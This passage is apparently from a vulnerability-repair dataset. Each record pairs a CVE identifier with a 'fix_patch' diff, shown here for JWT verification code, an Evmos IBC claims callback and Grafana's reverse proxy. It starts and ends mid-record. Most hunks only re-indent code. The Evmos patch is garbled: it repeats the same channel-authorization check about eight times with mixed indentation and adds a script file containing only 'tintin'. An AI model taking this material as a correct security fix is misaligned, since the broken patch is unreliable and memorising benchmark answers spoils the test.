= t.JWT.Claims(signingKey, &claims)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        // Verify that the Issuer claim is a trusted authority.\n+        if !contains(verifyOpts.TrustedIssuers, claims.Issuer) {\n+                log.Infof(\"token from untrusted issuer: %q\", claims.Issuer)\n+                return nil, ErrInvalidToken\n+        }\n+\n+        // Verify that the Audience claim is allowed.\n+        if !containsAny(verifyOpts.AcceptedAudiences, claims.Audience) {\n+                log.Infof(\"token intended for another audience: %v\", claims.Audience)\n+                return nil, ErrInvalidToken\n+        }\n+\n+        // Verify that the token is currently usable and not expired.\n+        currentTime := time.Now()\n+\n+        ExpWithLeeway := time.Unix(claims.Expiration, 0).Add(Leeway)\n+        if currentTime.After(ExpWithLeeway) {\n+                log.Infof(\"token not to be used after %s - currently %s\", ExpWithLeeway, currentTime)\n+                return nil, ErrInvalidToken\n+        }\n+\n+        NotBeforeWithLeeway := time.Unix(claims.NotBefore, 0).Add(-Leeway)\n+        if currentTime.Before(NotBeforeWithLeeway) {\n+                log.Infof(\"token not to be used before %s - currently %s\", NotBeforeWithLeeway, currentTime)\n+                return nil, ErrInvalidToken\n+        }\n+\n+        return &claims, nil\n }\n \n // VerifySigningKey attempts to verify and return the signing key which was used to sign the token.\n func (t *Token) VerifySigningKey(verifyOpts VerifyOptions) (crypto.PublicKey, error) {\n-\tif len(t.JWT.Headers) == 0 {\n-\t\treturn nil, ErrInvalidToken\n-\t}\n-\n-\t// NOTE(milosgajdos): docker auth spec does not seem to\n-\t// support tokens signed by multiple signatures so we are\n-\t// verifying the first one in the list only at the moment.\n-\theader := t.JWT.Headers[0]\n-\n-\tsigningKey, err := verifyCertChain(header, verifyOpts.Roots)\n-\tif err != nil {\n-\t\t// NOTE(milosgajdos): if the x5c header is missing\n-\t\t// the token may have been signed by a JWKS.\n-\t\tif errors.Is(err, jose.ErrMissingX5cHeader) {\n-\t\t\tswitch {\n-\t\t\tcase header.JSONWebKey != nil:\n-\t\t\t\treturn verifyJWK(header, verifyOpts)\n-\t\t\tcase header.KeyID != \"\":\n-\t\t\t\tif signingKey, ok := verifyOpts.TrustedKeys[header.KeyID]; ok {\n-\t\t\t\t\treturn signingKey, nil\n-\t\t\t\t}\n-\t\t\t\treturn nil, fmt.Errorf(\"token signed by untrusted key with ID: %q\", header.KeyID)\n-\t\t\tdefault:\n-\t\t\t\treturn nil, ErrInvalidToken\n-\t\t\t}\n-\t\t}\n-\t\treturn nil, err\n-\t}\n-\n-\treturn signingKey, nil\n+        if len(t.JWT.Headers) == 0 {\n+                return nil, ErrInvalidToken\n+        }\n+\n+        // NOTE(milosgajdos): docker auth spec does not seem to\n+        // support tokens signed by multiple signatures so we are\n+        // verifying the first one in the list only at the moment.\n+        header := t.JWT.Headers[0]\n+\n+        signingKey, err := verifyCertChain(header, verifyOpts.Roots)\n+        if err != nil {\n+                // NOTE(milosgajdos): if the x5c header is missing\n+                // the token may have been signed by a JWKS.\n+                if errors.Is(err, jose.ErrMissingX5cHeader) {\n+                        switch {\n+                        case header.JSONWebKey != nil:\n+                                return verifyJWK(header, verifyOpts)\n+                        case header.KeyID != \"\":\n+                                if signingKey, ok := verifyOpts.TrustedKeys[header.KeyID]; ok {\n+                                        return signingKey, nil\n+                                }\n+                                return nil, fmt.Errorf(\"token signed by untrusted key with ID: %q\", header.KeyID)\n+                        default:\n+                                return nil, ErrInvalidToken\n+                        }\n+                }\n+                return nil, err\n+        }\n+\n+        return signingKey, nil\n }\n \n func verifyCertChain(header jose.Header, roots *x509.CertPool) (signingKey crypto.PublicKey, err error) {\n-\tverifyOpts := x509.VerifyOptions{\n-\t\tRoots:     roots,\n-\t\tKeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageAny},\n-\t}\n-\n-\t// TODO: this call returns certificate chains which we ignore for now, but\n-\t// we should check them for revocations if we have the ability later.\n-\tchains, err := header.Certificates(verifyOpts)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tsigningKey = getCertPubKey(chains)\n-\n-\treturn\n+        verifyOpts := x509.VerifyOptions{\n+                Roots:     roots,\n+                KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageAny},\n+        }\n+\n+        // TODO: this call returns certificate chains which we ignore for now, but\n+        // we should check them for revocations if we have the ability later.\n+        chains, err := header.Certificates(verifyOpts)\n+        if err != nil {\n+                return nil, err\n+        }\n+        signingKey = getCertPubKey(chains)\n+\n+        return\n }\n \n func verifyJWK(header jose.Header, verifyOpts VerifyOptions) (signingKey crypto.PublicKey, err error) {\n-\tjwk := header.JSONWebKey\n-\tsigningKey = jwk.Key\n-\n-\t// Check to see if the key includes a certificate chain.\n-\tif len(jwk.Certificates) == 0 {\n-\t\t// The JWK should be one of the trusted root keys.\n-\t\tif _, trusted := verifyOpts.TrustedKeys[jwk.KeyID]; !trusted {\n-\t\t\treturn nil, errors.New(\"untrusted JWK with no certificate chain\")\n-\t\t}\n-\t\t// The JWK is one of the trusted keys.\n-\t\treturn\n-\t}\n-\n-\topts := x509.VerifyOptions{\n-\t\tRoots:     verifyOpts.Roots,\n-\t\tKeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageAny},\n-\t}\n-\n-\tleaf := jwk.Certificates[0]\n-\tif opts.Intermediates == nil {\n-\t\topts.Intermediates = x509.NewCertPool()\n-\t\tfor _, intermediate := range jwk.Certificates[1:] {\n-\t\t\topts.Intermediates.AddCert(intermediate)\n-\t\t}\n-\t}\n-\n-\t// TODO: this call returns certificate chains which we ignore for now, but\n-\t// we should check them for revocations if we have the ability later.\n-\tchains, err := leaf.Verify(opts)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tsigningKey = getCertPubKey(chains)\n-\n-\treturn\n+        jwk := header.JSONWebKey\n+        signingKey = jwk.Key\n+\n+        // Check to see if the key includes a certificate chain.\n+        if len(jwk.Certificates) == 0 {\n+                // The JWK should be one of the trusted root keys.\n+                if _, trusted := verifyOpts.TrustedKeys[jwk.KeyID]; !trusted {\n+                        return nil, errors.New(\"untrusted JWK with no certificate chain\")\n+                }\n+                // The JWK is one of the trusted keys.\n+                return\n+        }\n+\n+        opts := x509.VerifyOptions{\n+                Roots:     verifyOpts.Roots,\n+                KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageAny},\n+        }\n+\n+        leaf := jwk.Certificates[0]\n+        if opts.Intermediates == nil {\n+                opts.Intermediates = x509.NewCertPool()\n+                for _, intermediate := range jwk.Certificates[1:] {\n+                        opts.Intermediates.AddCert(intermediate)\n+                }\n+        }\n+\n+        // TODO: this call returns certificate chains which we ignore for now, but\n+        // we should check them for revocations if we have the ability later.\n+        chains, err := leaf.Verify(opts)\n+        if err != nil {\n+                return nil, err\n+        }\n+        signingKey = getCertPubKey(chains)\n+\n+        return\n }\n \n func getCertPubKey(chains [][]*x509.Certificate) crypto.PublicKey {\n-\t// NOTE(milosgajdos): if there are no certificates\n-\t// header.Certificates call above returns error, so we are\n-\t// guaranteed to get at least one certificate chain.\n-\t// We pick the leaf certificate chain.\n-\tchain := chains[0]\n-\n-\t// NOTE(milosgajdos): header.Certificates call returns the result\n-\t// of leafCert.Verify which is a call to x509.Certificate.Verify.\n-\t// If successful, it returns one or more chains where the first\n-\t// element of the chain is x5c and the last element is from opts.Roots.\n-\t// See: https://pkg.go.dev/crypto/x509#Certificate.Verify\n-\tcert := chain[0]\n-\n-\t// NOTE: we dont have to verify that the public key in the leaf cert\n-\t// *is* the signing key: if it's not the signing then token claims\n-\t// verification with this key fails\n-\treturn cert.PublicKey.(crypto.PublicKey)\n+        // NOTE(milosgajdos): if there are no certificates\n+        // header.Certificates call above returns error, so we are\n+        // guaranteed to get at least one certificate chain.\n+        // We pick the leaf certificate chain.\n+        chain := chains[0]\n+\n+        // NOTE(milosgajdos): header.Certificates call returns the result\n+        // of leafCert.Verify which is a call to x509.Certificate.Verify.\n+        // If successful, it returns one or more chains where the first\n+        // element of the chain is x5c and the last element is from opts.Roots.\n+        // See: https://pkg.go.dev/crypto/x509#Certificate.Verify\n+        cert := chain[0]\n+\n+        // NOTE: we dont have to verify that the public key in the leaf cert\n+        // *is* the signing key: if it's not the signing then token claims\n+        // verification with this key fails\n+        return cert.PublicKey.(crypto.PublicKey)\n }\n \n // accessSet returns a set of actions available for the resource\n // actions listed in the `access` section of this token.\n func (c *ClaimSet) accessSet() accessSet {\n-\taccessSet := make(accessSet, len(c.Access))\n-\n-\tfor _, resourceActions := range c.Access {\n-\t\tresource := auth.Resource{\n-\t\t\tType: resourceActions.Type,\n-\t\t\tName: resourceActions.Name,\n-\t\t}\n-\n-\t\tset, exists := accessSet[resource]\n-\t\tif !exists {\n-\t\t\tset = newActionSet()\n-\t\t\taccessSet[resource] = set\n-\t\t}\n-\n-\t\tfor _, action := range resourceActions.Actions {\n-\t\t\tset.add(action)\n-\t\t}\n-\t}\n-\n-\treturn accessSet\n+        accessSet := make(accessSet, len(c.Access))\n+\n+        for _, resourceActions := range c.Access {\n+                resource := auth.Resource{\n+                        Type: resourceActions.Type,\n+                        Name: resourceActions.Name,\n+                }\n+\n+                set, exists := accessSet[resource]\n+                if !exists {\n+                        set = newActionSet()\n+                        accessSet[resource] = set\n+                }\n+\n+                for _, action := range resourceActions.Actions {\n+                        set.add(action)\n+                }\n+        }\n+\n+        return accessSet\n }\n \n func (c *ClaimSet) resources() []auth.Resource {\n-\tresourceSet := map[auth.Resource]struct{}{}\n-\n-\tfor _, resourceActions := range c.Access {\n-\t\tresource := auth.Resource{\n-\t\t\tType:  resourceActions.Type,\n-\t\t\tClass: resourceActions.Class,\n-\t\t\tName:  resourceActions.Name,\n-\t\t}\n-\t\tresourceSet[resource] = struct{}{}\n-\t}\n-\n-\tresources := make([]auth.Resource, 0, len(resourceSet))\n-\tfor resource := range resourceSet {\n-\t\tresources = append(resources, resource)\n-\t}\n-\n-\treturn resources\n+        resourceSet := map[auth.Resource]struct{}{}\n+\n+        for _, resourceActions := range c.Access {\n+                resource := auth.Resource{\n+                        Type:  resourceActions.Type,\n+                        Class: resourceActions.Class,\n+                        Name:  resourceActions.Name,\n+                }\n+                resourceSet[resource] = struct{}{}\n+        }\n+\n+        resources := make([]auth.Resource, 0, len(resourceSet))\n+        for resource := range resourceSet {\n+                resources = append(resources, resource)\n+        }\n+\n+        return resources\n }\n"}
{"cve":"CVE-2022-24738:0708", "fix_patch": "diff --git a/reproduce_vulnerability.sh b/reproduce_vulnerability.sh\nnew file mode 100644\nindex 00000000..eb6e267b\n--- /dev/null\n+++ b/reproduce_vulnerability.sh\n@@ -0,0 +1 @@\n+tintin\n\\ No newline at end of file\ndiff --git a/x/claims/keeper/ibc_callbacks.go b/x/claims/keeper/ibc_callbacks.go\nindex 5a27b235..106813c2 100644\n--- a/x/claims/keeper/ibc_callbacks.go\n+++ b/x/claims/keeper/ibc_callbacks.go\n@@ -1,107 +1,148 @@\n package keeper\n \n import (\n-\t\"strings\"\n+        \"strings\"\n \n-\tsdk \"github.com/cosmos/cosmos-sdk/types\"\n-\tsdkerrors \"github.com/cosmos/cosmos-sdk/types/errors\"\n-\ttransfertypes \"github.com/cosmos/ibc-go/v3/modules/apps/transfer/types\"\n-\tchanneltypes \"github.com/cosmos/ibc-go/v3/modules/core/04-channel/types\"\n-\t\"github.com/cosmos/ibc-go/v3/modules/core/exported\"\n+        sdk \"github.com/cosmos/cosmos-sdk/types\"\n+        sdkerrors \"github.com/cosmos/cosmos-sdk/types/errors\"\n+        transfertypes \"github.com/cosmos/ibc-go/v3/modules/apps/transfer/types\"\n+        channeltypes \"github.com/cosmos/ibc-go/v3/modules/core/04-channel/types\"\n+        \"github.com/cosmos/ibc-go/v3/modules/core/exported\"\n \n-\t\"github.com/tharsis/evmos/v2/x/claims/types\"\n+        \"github.com/tharsis/evmos/v2/x/claims/types\"\n )\n \n // OnRecvPacket performs an IBC receive callback. It performs a no-op if\n // claims are inactive\n func (k Keeper) OnRecvPacket(\n-\tctx sdk.Context,\n-\tpacket channeltypes.Packet,\n-\tack exported.Acknowledgement,\n+        ctx sdk.Context,\n+        packet channeltypes.Packet,\n+        ack exported.Acknowledgement,\n ) exported.Acknowledgement {\n-\tparams := k.GetParams(ctx)\n-\n-\t// short circuit in case claim is not active (no-op)\n-\tif !params.IsClaimsActive(ctx.BlockTime()) {\n-\t\treturn ack\n-\t}\n-\n-\t// unmarshal packet data to obtain the sender and recipient\n-\tvar data transfertypes.FungibleTokenPacketData\n-\tif err := transfertypes.ModuleCdc.UnmarshalJSON(packet.GetData(), &data); err != nil {\n-\t\terr = sdkerrors.Wrapf(sdkerrors.ErrUnknownRequest, \"cannot unmarshal ICS-20 transfer packet data\")\n-\t\treturn channeltypes.NewErrorAcknowledgement(err.Error())\n-\t}\n-\n-\t// validate the sender bech32 address from the counterparty chain\n-\tbech32Prefix := strings.Split(data.Sender, \"1\")[0]\n-\tif bech32Prefix == data.Sender {\n-\t\treturn channeltypes.NewErrorAcknowledgement(\n-\t\t\tsdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, \"invalid sender: %s\", data.Sender).Error(),\n-\t\t)\n-\t}\n-\n-\tsenderBz, err := sdk.GetFromBech32(data.Sender, bech32Prefix)\n-\tif err != nil {\n-\t\treturn channeltypes.NewErrorAcknowledgement(\n-\t\t\tsdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, \"invalid sender %s, %s\", data.Sender, err.Error()).Error(),\n-\t\t)\n-\t}\n-\n-\t// change the bech32 human readable prefix (HRP) of the sender to `evmos1`\n-\tsender := sdk.AccAddress(senderBz)\n-\n-\t// obtain the evmos recipient address\n-\trecipient, err := sdk.AccAddressFromBech32(data.Receiver)\n-\tif err != nil {\n-\t\treturn channeltypes.NewErrorAcknowledgement(\n-\t\t\tsdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, \"invalid receiver address %s\", err.Error()).Error(),\n-\t\t)\n-\t}\n-\n-\tsenderClaimsRecord, senderRecordFound := k.GetClaimsRecord(ctx, sender)\n-\trecipientClaimsRecord, recipientRecordFound := k.GetClaimsRecord(ctx, recipient)\n-\n-\t// handle the 4 cases for the recipient and sender claim records\n-\n-\tswitch {\n-\tcase senderRecordFound && recipientRecordFound:\n-\t\t// 1. Both sender and recipient have a claims record\n-\t\t// Merge sender's record with the recipient's record and\n-\t\t// claim actions that have been completed by one or the other\n-\t\trecipientClaimsRecord, err = k.MergeClaimsRecords(ctx, recipient, senderClaimsRecord, recipientClaimsRecord, params)\n-\t\tif err != nil {\n-\t\t\treturn channeltypes.NewErrorAcknowledgement(err.Error())\n-\t\t}\n-\n-\t\t// update the recipient's record with the new merged one, while deleting the\n-\t\t// sender's record\n-\t\tk.SetClaimsRecord(ctx, recipient, recipientClaimsRecord)\n-\t\tk.DeleteClaimsRecord(ctx, sender)\n-\tcase senderRecordFound && !recipientRecordFound:\n-\t\t// 2. Only the sender has a claims record.\n-\t\t// Migrate the sender record to the recipient address\n-\t\tk.SetClaimsRecord(ctx, recipient, senderClaimsRecord)\n-\t\tk.DeleteClaimsRecord(ctx, sender)\n-\n-\t\t// claim IBC action\n-\t\t_, err = k.ClaimCoinsForAction(ctx, recipient, senderClaimsRecord, types.ActionIBCTransfer, params)\n-\tcase !senderRecordFound && recipientRecordFound:\n-\t\t// 3. Only the recipient has a claims record.\n-\t\t// Only claim IBC transfer action\n-\t\t_, err = k.ClaimCoinsForAction(ctx, recipient, recipientClaimsRecord, types.ActionIBCTransfer, params)\n-\tcase !senderRecordFound && !recipientRecordFound:\n-\t\t// 4. Neither the sender or recipient have a claims record.\n-\t\t// Perform a no-op by returning the  original success acknowledgement\n-\t\treturn ack\n-\t}\n-\n-\tif err != nil {\n-\t\treturn channeltypes.NewErrorAcknowledgement(err.Error())\n-\t}\n-\n-\t// return the original success acknowledgement\n-\treturn ack\n+        params := k.GetParams(ctx)\n+\n+        // short circuit in case claim is not active (no-op)\n+        if !params.IsClaimsActive(ctx.BlockTime()) {\n+                return ack\n+        }\n+\n+// short circuit if the packet is not from an authorized channel and not from an EVM channel\n+if !params.IsAuthorizedChannel(packet.DestinationChannel) && !params.IsEVMChannel(packet.DestinationChannel) {\n+return ack\n+}\n+\n+// short circuit if the packet is not from an authorized channel and not from an EVM channel\n+if !params.IsAuthorizedChannel(packet.DestinationChannel) && !params.IsEVMChannel(packet.DestinationChannel) {\n+return ack\n+}\n+\n+\n+// short circuit if the packet is not from an authorized channel\n+if !params.IsAuthorizedChannel(packet.DestinationChannel) {\n+return ack\n+}\n+\n+        // short circuit if the packet is not from an authorized channel and not from an EVM channel\n+        if !params.IsAuthorizedChannel(packet.DestinationChannel) && !params.IsEVMChannel(packet.DestinationChannel) {\n+                return ack\n+        }\n+\n+        // short circuit if the packet is not from an authorized channel and not from an EVM channel\n+        if !params.IsAuthorizedChannel(packet.DestinationChannel) && !params.IsEVMChannel(packet.DestinationChannel) {\n+                return ack\n+        }\n+\n+        // short circuit if the packet is not from an authorized channel and not from an EVM channel\n+        if !params.IsAuthorizedChannel(packet.DestinationChannel) && !params.IsEVMChannel(packet.DestinationChannel) {\n+                return ack\n+        }\n+\n+\n+// short circuit if the packet is not from an authorized channel\n+if !params.IsAuthorizedChannel(packet.DestinationChannel) && !params.IsEVMChannel(packet.DestinationChannel) {\n+return ack\n+}\n+// short circuit if the packet is not from an authorized channel and not from an EVM channel\n+if !params.IsAuthorizedChannel(packet.DestinationChannel) && !params.IsEVMChannel(packet.DestinationChannel) {\n+return ack\n+}\n+\n+        // unmarshal packet data to obtain the sender and recipient\n+        var data transfertypes.FungibleTokenPacketData\n+        if err := transfertypes.ModuleCdc.UnmarshalJSON(packet.GetData(), &data); err != nil {\n+                err = sdkerrors.Wrapf(sdkerrors.ErrUnknownRequest, \"cannot unmarshal ICS-20 transfer packet data\")\n+                return channeltypes.NewErrorAcknowledgement(err.Error())\n+        }\n+\n+        // validate the sender bech32 address from the counterparty chain\n+        bech32Prefix := strings.Split(data.Sender, \"1\")[0]\n+        if bech32Prefix == data.Sender {\n+                return channeltypes.NewErrorAcknowledgement(\n+                        sdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, \"invalid sender: %s\", data.Sender).Error(),\n+                )\n+        }\n+\n+        senderBz, err := sdk.GetFromBech32(data.Sender, bech32Prefix)\n+        if err != nil {\n+                return channeltypes.NewErrorAcknowledgement(\n+                        sdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, \"invalid sender %s, %s\", data.Sender, err.Error()).Error(),\n+                )\n+        }\n+\n+        // change the bech32 human readable prefix (HRP) of the sender to `evmos1`\n+        sender := sdk.AccAddress(senderBz)\n+\n+        // obtain the evmos recipient address\n+        recipient, err := sdk.AccAddressFromBech32(data.Receiver)\n+        if err != nil {\n+                return channeltypes.NewErrorAcknowledgement(\n+                        sdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, \"invalid receiver address %s\", err.Error()).Error(),\n+                )\n+        }\n+\n+        senderClaimsRecord, senderRecordFound := k.GetClaimsRecord(ctx, sender)\n+        recipientClaimsRecord, recipientRecordFound := k.GetClaimsRecord(ctx, recipient)\n+\n+        // handle the 4 cases for the recipient and sender claim records\n+\n+        switch {\n+        case senderRecordFound && recipientRecordFound:\n+                // 1. Both sender and recipient have a claims record\n+                // Merge sender's record with the recipient's record and\n+                // claim actions that have been completed by one or the other\n+                recipientClaimsRecord, err = k.MergeClaimsRecords(ctx, recipient, senderClaimsRecord, recipientClaimsRecord, params)\n+                if err != nil {\n+                        return channeltypes.NewErrorAcknowledgement(err.Error())\n+                }\n+\n+                // update the recipient's record with the new merged one, while deleting the\n+                // sender's record\n+                k.SetClaimsRecord(ctx, recipient, recipientClaimsRecord)\n+                k.DeleteClaimsRecord(ctx, sender)\n+        case senderRecordFound && !recipientRecordFound:\n+                // 2. Only the sender has a claims record.\n+                // Migrate the sender record to the recipient address\n+                k.SetClaimsRecord(ctx, recipient, senderClaimsRecord)\n+                k.DeleteClaimsRecord(ctx, sender)\n+\n+                // claim IBC action\n+                _, err = k.ClaimCoinsForAction(ctx, recipient, senderClaimsRecord, types.ActionIBCTransfer, params)\n+        case !senderRecordFound && recipientRecordFound:\n+                // 3. Only the recipient has a claims record.\n+                // Only claim IBC transfer action\n+                _, err = k.ClaimCoinsForAction(ctx, recipient, recipientClaimsRecord, types.ActionIBCTransfer, params)\n+        case !senderRecordFound && !recipientRecordFound:\n+                // 4. Neither the sender or recipient have a claims record.\n+                // Perform a no-op by returning the  original success acknowledgement\n+                return ack\n+        }\n+\n+        if err != nil {\n+                return channeltypes.NewErrorAcknowledgement(err.Error())\n+        }\n+\n+        // return the original success acknowledgement\n+        return ack\n }\n \n // OnAcknowledgementPacket claims the amount from the `ActionIBCTransfer` for\n@@ -109,49 +150,49 @@ func (k Keeper) OnRecvPacket(\n // The function performs a no-op if claims are disabled globally,\n // acknowledgment failed, or if sender the sender has no claims record.\n func (k Keeper) OnAcknowledgementPacket(\n-\tctx sdk.Context,\n-\tpacket channeltypes.Packet,\n-\tacknowledgement []byte,\n+        ctx sdk.Context,\n+        packet channeltypes.Packet,\n+        acknowledgement []byte,\n ) error {\n-\tparams := k.GetParams(ctx)\n-\n-\t// short circuit in case claim is not active (no-op)\n-\tif !params.IsClaimsActive(ctx.BlockTime()) {\n-\t\treturn nil\n-\t}\n-\n-\tvar ack channeltypes.Acknowledgement\n-\tif err := transfertypes.ModuleCdc.UnmarshalJSON(acknowledgement, &ack); err != nil {\n-\t\treturn sdkerrors.Wrapf(sdkerrors.ErrUnknownRequest, \"cannot unmarshal ICS-20 transfer packet acknowledgement: %v\", err)\n-\t}\n-\n-\t// no-op if the acknowledgement is an error ACK\n-\tif !ack.Success() {\n-\t\treturn nil\n-\t}\n-\n-\tvar data transfertypes.FungibleTokenPacketData\n-\tif err := transfertypes.ModuleCdc.UnmarshalJSON(packet.GetData(), &data); err != nil {\n-\t\treturn sdkerrors.Wrapf(sdkerrors.ErrUnknownRequest, \"cannot unmarshal ICS-20 transfer packet data: %s\", err.Error())\n-\t}\n-\n-\tsender, err := sdk.AccAddressFromBech32(data.Sender)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tclaimRecord, found := k.GetClaimsRecord(ctx, sender)\n-\tif !found {\n-\t\t// no-op. The user doesn't have a claim record so we don't need to perform\n-\t\t// any claim\n-\t\treturn nil\n-\t}\n-\n-\t// claim IBC transfer action\n-\t_, err = k.ClaimCoinsForAction(ctx, sender, claimRecord, types.ActionIBCTransfer, params)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\treturn nil\n+        params := k.GetParams(ctx)\n+\n+        // short circuit in case claim is not active (no-op)\n+        if !params.IsClaimsActive(ctx.BlockTime()) {\n+                return nil\n+        }\n+\n+        var ack channeltypes.Acknowledgement\n+        if err := transfertypes.ModuleCdc.UnmarshalJSON(acknowledgement, &ack); err != nil {\n+                return sdkerrors.Wrapf(sdkerrors.ErrUnknownRequest, \"cannot unmarshal ICS-20 transfer packet acknowledgement: %v\", err)\n+        }\n+\n+        // no-op if the acknowledgement is an error ACK\n+        if !ack.Success() {\n+                return nil\n+        }\n+\n+        var data transfertypes.FungibleTokenPacketData\n+        if err := transfertypes.ModuleCdc.UnmarshalJSON(packet.GetData(), &data); err != nil {\n+                return sdkerrors.Wrapf(sdkerrors.ErrUnknownRequest, \"cannot unmarshal ICS-20 transfer packet data: %s\", err.Error())\n+        }\n+\n+        sender, err := sdk.AccAddressFromBech32(data.Sender)\n+        if err != nil {\n+                return err\n+        }\n+\n+        claimRecord, found := k.GetClaimsRecord(ctx, sender)\n+        if !found {\n+                // no-op. The user doesn't have a claim record so we don't need to perform\n+                // any claim\n+                return nil\n+        }\n+\n+        // claim IBC transfer action\n+        _, err = k.ClaimCoinsForAction(ctx, sender, claimRecord, types.ActionIBCTransfer, params)\n+        if err != nil {\n+                return err\n+        }\n+\n+        return nil\n }\n"}
{"cve":"CVE-2022-31130:0708", "fix_patch": "diff --git a/pkg/util/proxyutil/reverse_proxy.go b/pkg/util/proxyutil/reverse_proxy.go\nindex 3ce5d3b4011..e01ff416c78 100644\n--- a/pkg/util/proxyutil/reverse_proxy.go\n+++ b/pkg/util/proxyutil/reverse_proxy.go\n@@ -1,15 +1,15 @@\n package proxyutil\n \n import (\n-\t\"context\"\n-\t\"errors\"\n-\t\"log\"\n-\t\"net/http\"\n-\t\"net/http/httputil\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\tglog \"github.com/grafana/grafana/pkg/infra/log\"\n+        \"context\"\n+        \"errors\"\n+        \"log\"\n+        \"net/http\"\n+        \"net/http/httputil\"\n+        \"strings\"\n+        \"time\"\n+\n+        glog \"github.com/grafana/grafana/pkg/infra/log\"\n )\n \n // StatusClientClosedRequest A non-standard status code introduced by nginx\n@@ -23,70 +23,74 @@ type ReverseProxyOption func(*httputil.ReverseProxy)\n \n // NewReverseProxy creates a new httputil.ReverseProxy with sane default configuration.\n func NewReverseProxy(logger glog.Logger, director func(*http.Request), opts ...ReverseProxyOption) *httputil.ReverseProxy {\n-\tif logger == nil {\n-\t\tpanic(\"logger cannot be nil\")\n-\t}\n-\n-\tif director == nil {\n-\t\tpanic(\"director cannot be nil\")\n-\t}\n-\n-\tp := &httputil.ReverseProxy{\n-\t\tFlushInterval: time.Millisecond * 200,\n-\t\tErrorHandler:  errorHandler(logger),\n-\t\tErrorLog:      log.New(&logWrapper{logger: logger}, \"\", 0),\n-\t\tDirector:      director,\n-\t}\n-\n-\tfor _, opt := range opts {\n-\t\topt(p)\n-\t}\n-\n-\torigDirector := p.Director\n-\tp.Director = wrapDirector(origDirector)\n-\n-\tif p.ModifyResponse == nil {\n-\t\t// nolint:bodyclose\n-\t\tp.ModifyResponse = modifyResponse(logger)\n-\t} else {\n-\t\tmodResponse := p.ModifyResponse\n-\t\tp.ModifyResponse = func(resp *http.Response) error {\n-\t\t\tif err := modResponse(resp); err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\n-\t\t\t// nolint:bodyclose\n-\t\t\treturn modifyResponse(logger)(resp)\n-\t\t}\n-\t}\n-\n-\treturn p\n+        if logger == nil {\n+                panic(\"logger cannot be nil\")\n+        }\n+\n+        if director == nil {\n+                panic(\"director cannot be nil\")\n+        }\n+\n+        p := &httputil.ReverseProxy{\n+                FlushInterval: time.Millisecond * 200,\n+                ErrorHandler:  errorHandler(logger),\n+                ErrorLog:      log.New(&logWrapper{logger: logger}, \"\", 0),\n+                Director:      director,\n+        }\n+\n+        for _, opt := range opts {\n+                opt(p)\n+        }\n+\n+        origDirector := p.Director\n+        p.Director = wrapDirector(origDirector)\n+\n+        if p.ModifyResponse == nil {\n+                // nolint:bodyclose\n+                p.ModifyResponse = modifyResponse(logger)\n+        } else {\n+                modResponse := p.ModifyResponse\n+                p.ModifyResponse = func(resp *http.Response) error {\n+                        if err := modResponse(resp); err != nil {\n+                                return err\n+                        }\n+\n+                        // nolint:bodyclose\n+                        return modifyResponse(logger)(resp)\n+                }\n+        }\n+\n+        return p\n }\n \n // wrapDirector wraps a director and adds additional functionality.\n func wrapDirector(d func(*http.Request)) func(req *http.Request) {\n-\treturn func(req *http.Request) {\n-\t\td(req)\n-\t\tPrepareProxyRequest(req)\n-\n-\t\t// Clear Origin and Referer to avoid CORS issues\n-\t\treq.Header.Del(\"Origin\")\n-\t\treq.Header.Del(\"Referer\")\n-\t}\n+        return func(req *http.Request) {\n+                d(req)\n+                PrepareProxyRequest(req)\n+\n+                // Clear authentication headers to avoid leakage to plugins\n+                req.Header.Del(\"Authorization\")\n+                req.Header.Del(\"X-Grafana-Token\")\n+\n+                // Clear Origin and Referer to avoid CORS issues\n+                req.Header.Del(\"Origin\")\n+                req.Header.Del(\"Referer\")\n+        }\n }\n \n // modifyResponse enforces certain constraints on http.Response.\n func modifyResponse(logger glog.Logger) func(resp *http.Response) error {\n-\treturn func(resp *http.Response) error {\n-\t\tresp.Header.Del(\"Set-Cookie\")\n-\t\tSetProxyResponseHeaders(resp.Header)\n-\t\treturn nil\n-\t}\n+        return func(resp *http.Response) error {\n+                resp.Header.Del(\"Set-Cookie\")\n+                SetProxyResponseHeaders(resp.Header)\n+                return nil\n+        }\n }\n \n type timeoutError interface {\n-\terror\n-\tTimeout() bool\n+        error\n+        Timeout() bool\n }\n \n // errorHandler handles any errors happening while proxying a request and enforces\n@@ -95,52 +99,52 @@ type timeoutError interface {\n // If timeout happens while communicating with upstream server we return http.StatusGatewayTimeout.\n // If any other error we return http.StatusBadGateway.\n func errorHandler(logger glog.Logger) func(http.ResponseWriter, *http.Request, error) {\n-\treturn func(w http.ResponseWriter, r *http.Request, err error) {\n-\t\tif errors.Is(err, context.Canceled) {\n-\t\t\tlogger.Debug(\"Proxy request cancelled by client\")\n-\t\t\tw.WriteHeader(StatusClientClosedRequest)\n-\t\t\treturn\n-\t\t}\n-\n-\t\t// nolint:errorlint\n-\t\tif timeoutErr, ok := err.(timeoutError); ok && timeoutErr.Timeout() {\n-\t\t\tlogger.Error(\"Proxy request timed out\", \"err\", err)\n-\t\t\tw.WriteHeader(http.StatusGatewayTimeout)\n-\t\t\treturn\n-\t\t}\n-\n-\t\tlogger.Error(\"Proxy request failed\", \"err\", err)\n-\t\tw.WriteHeader(http.StatusBadGateway)\n-\t}\n+        return func(w http.ResponseWriter, r *http.Request, err error) {\n+                if errors.Is(err, context.Canceled) {\n+                        logger.Debug(\"Proxy request cancelled by client\")\n+                        w.WriteHeader(StatusClientClosedRequest)\n+                        return\n+                }\n+\n+                // nolint:errorlint\n+                if timeoutErr, ok := err.(timeoutError); ok && timeoutErr.Timeout() {\n+                        logger.Error(\"Proxy request timed out\", \"err\", err)\n+                        